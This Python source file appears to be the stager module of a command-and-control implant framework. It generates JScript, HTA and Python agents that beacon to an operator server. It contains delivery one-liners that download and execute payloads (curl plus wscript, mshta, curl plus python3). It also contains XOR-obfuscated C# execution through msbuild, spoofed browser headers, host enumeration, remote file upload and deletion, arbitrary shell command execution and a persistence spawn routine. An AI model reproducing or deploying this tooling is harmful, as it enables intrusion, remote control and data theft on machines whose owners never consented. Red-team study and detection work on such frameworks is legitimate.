import base64
import urllib.parse as parse

from collections import namedtuple
from connect import util, loader, engine
from flask import make_response, render_template, send_file
from itertools import cycle

def xor_crypt_and_encode(data, key):
     xored = []
     for (x,y) in zip(data, cycle(key)):
         xored.append(x ^ ord(y))
     return(base64.b64encode(bytes(xored)).decode('utf-8'))

class Stager():

    function = namedtuple('Function', ['name', 'description', 'category', 'argparser', 'dependencies'])

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stdlib = {}
        self.variables = {}
        self.functions = {}
        self.setup_variables()
        self.setup_functions()
        self.setup_stdlib()

    def argparse_raw(self, response, arguments, checkin_uri, engine):
        return response, ','.join(arguments)

    def argparse_strings(self, response, arguments, checkin_uri, engine):
        arguments = '","'.join(arguments)
        arguments = f'"{arguments}"'
        return response, arguments

    def render(self, connection_id, checkin_uri):
        pass

    def setup_variables(self):
        pass

    def setup_functions(self):
        pass

    def setup_stdlib(self):
        pass

    def process_function(self, data, server_cli, response):
        pass

    def process_command(self, data, server_cli, response):
        pass

class JScriptStager(Stager):

    format = 'js'

    def __init__(self, ip, port):
        super().__init__(ip, port)
        self.deliveries = [('Windows', f'curl.exe {util.server_context()}://{self.ip}:{self.port}/-endpoint- -o connect.js & wscript /e:jscript connect.js'),]

    def argparse_msbuild(self, response, arguments, checkin_uri, engine):
        random_string = util.generate_str()
        encrypted_string = util.generate_str()
        csharp_bin_path = arguments[0]
        csharp_bin_b64_xor = xor_crypt_and_encode(loader.retrieve_file(csharp_bin_path), encrypted_string)
        list_of_arguments = '","'.join(arguments[1:])
        response = make_response(render_template(f'resources/msbuild.xml', arguments = f'"{list_of_arguments}"', csharp_bin = csharp_bin_b64_xor, variables = self.variables, encrypted_string = encrypted_string, random_string = random_string))
        arguments = ','.join(['response.ResponseBody', f'"{random_string}"'])
        return response, arguments

    def argparse_spawn(self, response, arguments, checkin_uri, engine):
        stager_format = arguments[0]
        stager = engine.retrieve_stager(stager_format)
        _new_connection = engine.create_connection(stager)
        response = make_response(_new_connection.stager.render(_new_connection.connection_id, checkin_uri))
        arguments = ','.join(['response.ResponseBody', f'"{stager_format}"'])
        return response, arguments

    def argparse_upload(self, response, arguments, checkin_uri, engine):
        local_file_path = arguments[0]
        remote_file_path = arguments[1]
        arguments.remove(local_file_path)
        response = make_response(send_file(local_file_path))
        arguments = ','.join(['response.ResponseBody', f'"{remote_file_path}"'])
        return response, arguments

    def render(self, connection_id, checkin_uri):
        return render_template(f'{self.format}/stager.{self.format}', connection_id = connection_id, checkin_uri = checkin_uri, variables=self.variables, server_context = util.server_context(), random_string = util.generate_str())

    def setup_variables(self):
        self.variables['errors'] = (util.generate_str(), 0)
        self.variables['file-system-object'] = (util.generate_str(), 'new ActiveXObject("Scripting.FileSystemObject")')
        self.variables['host'] = (util.generate_str(), self.ip)
        self.variables['port'] = (util.generate_str(), self.port)
        self.variables['post-req'] = (util.generate_str(), '')
        self.variables['sleep'] = (util.generate_str(), 3000)
        self.variables['useragent'] = (util.generate_str(), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0')
        self.variables['content-encoding'] = (util.generate_str(), 'gzip, deflate, br')
        self.variables['content-type'] = (util.generate_str(), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        self.variables['x-frame-options'] = (util.generate_str(), 'SAMEORIGIN')
        self.variables['wscript.shell'] = (util.generate_str(), 'new ActiveXObject("WScript.Shell")')
        self.variables['winhttp.winhttprequest'] = (util.generate_str(), 'new ActiveXObject("WinHttp.WinHttpRequest.5.1");')

        wscript = self.variables['wscript.shell'][0]
        self.variables['compsec'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%COMSPEC%")')
        self.variables['domain'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERDOMAIN%")')
        self.variables['hostname'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%COMPUTERNAME%")')
        self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%")')
        self.variables['product-name'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName")')
        self.variables['tmp'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%TMP%")')
        self.variables['build-number'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber")')

    def setup_functions(self):
        # Enumeration Options
        self.functions['domain'] = self.function('domain', 'Enumerate the current domain from environment variables', 'Enumeration Options', None, None)
        self.functions['hostname'] = self.function('hostname', 'Enumerate the current hostname from environment variables', 'Enumeration Options', None, None)
        self.functions['os'] = self.function('os', 'Enumerate the current operating system product name and build number', 'Enumeration Options', None, None)
        self.functions['sleep'] = self.function('sleep', 'Change the delay between checkins (e.g., sleep 5000) is a delay of 5 seconds', 'Enumeration Options', self.argparse_raw, None)
        self.functions['tmp'] = self.function('tmp', 'Enumerate the temporary directory from environment variables', 'Enumeration Options', None,  None)
        self.functions['whoami'] = self.function('whoami', 'Enumerate the current user from environment variables', 'Enumeration Options', None, None)
        self.functions['sysinfo'] = self.function('sysinfo', 'Enumerate the username, hostname, operating system and domain', 'Enumeration Options', None, [self.functions['whoami'], self.functions['os'], self.functions['hostname'], self.functions['domain']])

        # File System Options
        self.functions['dir'] = self.function('dir','Query directory information (e.g., dir C:/Remote/Directory/)',  'File System Options', self.argparse_strings, None)
        self.functions['upload'] = self.function('upload','Upload a file to the remote system (e.g., upload /local/File.txt C:/Remote/File.txt)', 'File System Options', self.argparse_upload, None)
        self.functions['retrieve'] = self.function('retrieve','Retrieve a files contents (e.g., retrieve C:/Remote/File.txt <string:bytes>)', 'File System Options', self.argparse_strings, None)
        self.functions['mkdir'] = self.function('mkdir','Create a new directory on the remote system (e.g., mkdir C:/Remote/Directory/)', 'File System Options', self.argparse_strings, None)
        self.functions['cpdir'] = self.function('cpdir','Copy a directory on the remote system (e.g., cpdir C:/Remote/Source/ C:/Remote/Destination/)', 'File System Options', self.argparse_strings, None)
        self.functions['mvdir'] = self.function('mvdir','Move a directory on the remote system (e.g., mvdir C:/Remote/Source/ C:/Remote/Destination/)', 'File System Options', self.argparse_strings, None)
        self.functions['deldir'] = self.function('deldir','Delete a directory on the remote system (e.g., deldir C:/Remote/Directory/)', 'File System Options', self.argparse_strings, None)
        self.functions['cpfile'] = self.function('cpfile','Copy a file on the remote system (e.g., cpfile C:/Remote/Source.txt C:/Remote/Destination.txt)', 'File System Options', self.argparse_strings, None)
        self.functions['mvfile'] = self.function('mvfile','Move a file on the remote system (e.g., mvfile C:/Remote/Source.txt C:/Remote/Destination.txt)', 'File System Options', self.argparse_strings, None)
        self.functions['delfile'] = self.function('delfile','Delete a file on the remote system (e.g., delfile C:/Remote/File.txt)', 'File System Options', self.argparse_strings, None)

        # Command Execution Options
        self.functions['comspec'] = self.function('comspec', 'Execute a command with the command sepecifier (e.g., comspec "whoami")', 'Command Execution Options', self.argparse_strings, [self.functions['delfile'], self.functions['retrieve']])
        self.functions['msbuild'] = self.function('msbuild', 'Execute a csharp binaries with msbuild (e.g., msbuild /local/File.exe)', 'Command Execution Options', self.argparse_msbuild, [self.functions['delfile'], self.functions['retrieve']])

        # Persistence Options
        self.functions['spawn'] = self.function('spawn', 'Spawns a new connection based on the format provided (e.g., spawn <js:hta>)', 'Persistence Options', self.argparse_spawn, [self.functions['upload'], self.functions['delfile']])

    def setup_stdlib(self):
        self.stdlib['kill'] = self.function('kill', 'Kill the current connection', 'Connection Options', None, None)

    def process_function(self, data, server_cli, response, checkin_uri, engine):
        server_cli.verbose(f'Sending .. {self.format}/functions/{data}.{self.format}', 1)
        response.headers['eval'] = parse.quote(render_template(f'{self.format}/functions/{data}.{self.format}', variables = self.variables, random_string = util.generate_str()))
        return response

    def process_command(self, data, server_cli, response, checkin_uri, engine):
        command = data[0]
        commands = self.functions
        commands.update(self.stdlib)
        if len(data) == 1:
            response.headers['eval'] = f'{command}()'
            server_cli.verbose(f'{command}()', 1)
            return response
        arguments = data[1:]
        if not commands[command].argparser:
            server_cli.print('information', f'This command does not accept arguments.')
        try:
            response, arguments = self.functions[command].argparser(response, arguments, checkin_uri, engine)
        except Exception as e:
            server_cli.print('error', f'Error parsing arguments: {e}')
            return response
        server_cli.verbose(f'Sending .. {command}({arguments})', 1)
        response.headers['eval'] = parse.quote(f'{command}({arguments})')
        return response

class MSHTAStager(JScriptStager):

    format = 'hta'

    def __init__(self, ip, port):
        super().__init__(ip, port)
        self.deliveries = [('Windows', f'mshta {util.server_context()}://{self.ip}:{self.port}/-endpoint-'),]

    def render(self, connection_id, checkin_uri):
        mshta_code = parse.quote(render_template(f'hta/code.hta', connection_id = connection_id, checkin_uri = checkin_uri, variables=self.variables, server_context = util.server_context(), random_string = util.generate_str()))
        return render_template(f'{self.format}/stager.{self.format}', connection_id = connection_id, checkin_uri = checkin_uri, variables=self.variables, server_context = util.server_context(), random_string = util.generate_str(), mshta_code = mshta_code)

class PYTHONStager(Stager):

    format = 'py'

    def __init__(self, ip, port):
        super().__init__(ip, port)
        self.deliveries = [('Linux', f'curl {util.server_context()}://{self.ip}:{self.port}/-endpoint- -o /tmp/connect.py && python3 /tmp/connect.py'),]

    def argparse_shell(self, response, arguments, checkin_uri, engine):
        return response, ' '.join(arguments)

    def process_function(self, data, server_cli, response, checkin_uri, engine):
        server_cli.verbose(f'Sending .. {self.format}/functions/{data}.{self.format}', 1)
        response.headers['eval'] = parse.quote(render_template(f'{self.format}/functions/{data}.{self.format}', variables = self.variables, random_string = util.generate_str()))
        return response

    def process_command(self, data, server_cli, response, checkin_uri, engine):
        command = data[0]
        commands = self.functions
        commands.update(self.stdlib)
        if len(data) == 1:
            server_cli.verbose(f'Sending .. {command}', 1)
            response.headers['eval'] = parse.quote(f'{command}')
            return response
        arguments = data[1:]
        if not commands[command].argparser:
            server_cli.print('information', f'This command does not accept arguments.')
        try:
            response, arguments = self.functions[command].argparser(response, arguments, checkin_uri, engine)
        except Exception as e:
            server_cli.print('error', f'Error parsing arguments: {e}')
            return response
        response.headers['eval'] = parse.quote(f'{arguments}')
        return response

    def render(self, connection_id, checkin_uri):
        return render_template(f'{self.format}/stager.{self.format}', connection_id = connection_id, checkin_uri = checkin_uri, variables=self.variables, server_context = util.server_context(), random_string = util.generate_str())

    def setup_variables(self):
        self.variables['errors'] = (util.generate_str(), 0)
        self.variables['host'] = (util.generate_str(), self.ip)
        self.variables['port'] = (util.generate_str(), self.port)
        self.variables['checkin'] = (util.generate_str(), '')
        self.variables['sleep'] = (util.generate_str(), 3)
        self.variables['useragent'] = (util.generate_str(), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0')
        self.variables['content-encoding'] = (util.generate_str(), 'gzip, deflate, br')
        self.variables['content-type'] = (util.generate_str(), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        self.variables['x-frame-options'] = (util.generate_str(), 'SAMEORIGIN')

    def setup_stdlib(self):
        self.stdlib['kill'] = self.function('kill', 'Kill the current connection', 'Connection Options', None, None)
        self.stdlib['shell'] = self.function('shell', 'Execute raw user input (e.g., shell whoami)', 'Command Execution Options', self.argparse_shell, None)
